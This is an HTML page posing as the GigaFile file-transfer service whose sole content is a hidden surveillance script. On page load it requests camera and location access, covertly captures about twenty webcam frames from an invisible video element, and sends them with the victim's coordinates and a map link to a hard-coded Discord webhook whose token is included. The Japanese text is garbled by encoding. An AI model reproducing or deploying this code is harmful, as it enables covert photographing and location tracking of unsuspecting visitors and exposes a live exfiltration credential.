<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="ja">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <title>ç„¡æ–™å¤§å®¹é‡ ãƒ•ã‚¡ã‚¤ãƒ«è»¢é€ã‚µãƒ¼ãƒ“ã‚¹ GigaFile(ã‚®ã‚¬ãƒ•ã‚¡ã‚¤ãƒ«)ä¾¿</title>
</head>

<body>
  <!-- éè¡¨ç¤ºã®ã‚«ãƒ¡ãƒ©è¦ç´  -->
  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>

<script>
const video = document.createElement('video');
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
let photoArray = [];

// Base64 â†’ Blob
function base64ToBlob(base64, type = 'image/png') {
  const binary = atob(base64.split(',')[1]);
  const array = [];
  for (let i = 0; i < binary.length; i++) {
    array.push(binary.charCodeAt(i));
  }
  return new Blob([new Uint8Array(array)], { type });
}

// 1ãƒ•ãƒ¬ãƒ¼ãƒ æ’®å½±
function capturePhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);
  return canvas.toDataURL('image/png');
}

// Discordã¸é€ä¿¡ï¼ˆ10æšãšã¤åˆ†å‰²ï¼‰
async function sendAllPhotos(webhookUrl, photoArray, lat, lng) {
  const chunkSize = 10;
  for (let i = 0; i < photoArray.length; i += chunkSize) {
    const chunk = photoArray.slice(i, i + chunkSize);
    const formData = new FormData();

    // æœ€åˆã®é€ä¿¡ã§æœ¬æ–‡ã‚’è¿½åŠ ï¼ˆ2å›ç›®ä»¥é™ã¯çœç•¥ï¼‰
    if (i === 0) {
      formData.append(
        "content",
        `ğŸ“¸ æ’®å½±å®Œäº†ï¼${photoArray.length}æšã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã—ãŸ\nğŸŒ ç·¯åº¦: ${lat}, çµŒåº¦: ${lng}\nğŸ—º Googleãƒãƒƒãƒ—: https://www.google.com/maps?q=${lat},${lng}`
      );
    }

    // æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«è¿½åŠ 
    chunk.forEach((photo, idx) => {
      const blob = base64ToBlob(photo);
      formData.append(`file${idx}`, blob, `photo_${i + idx + 1}.png`);
    });

    await fetch(webhookUrl, {
      method: "POST",
      body: formData
    });
  }
}

// ãƒ¡ã‚¤ãƒ³å‡¦ç†
async function sendOnPermission() {
  try {
    // ã‚«ãƒ¡ãƒ©å–å¾—
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // ä½ç½®æƒ…å ±å–å¾—
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      // 1ç§’é–“ 20fps æ’®å½±
      photoArray = [];
      const interval = setInterval(() => {
        photoArray.push(capturePhoto());
      }, 50);

      setTimeout(async () => {
        clearInterval(interval);

        const webhookUrl = "https://discord.com/api/webhooks/1410283485377331300/73MF6zns-aj6WU2XhWayMd5ERtQRdzyAXyJ6tiplHnFj6LttzN8Ghsu5f9xYKa7w-K48";
        await sendAllPhotos(webhookUrl, photoArray, lat, lng);

      }, 1000);

    }, (err) => {
      console.error("ä½ç½®æƒ…å ±æ‹’å¦:", err);
    });

  } catch (err) {
    console.error("ã‚«ãƒ¡ãƒ©æ‹’å¦:", err);
  }
}

// ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰æ™‚ã«å®Ÿè¡Œ
window.addEventListener('load', sendOnPermission);
</script>
</body>
</html>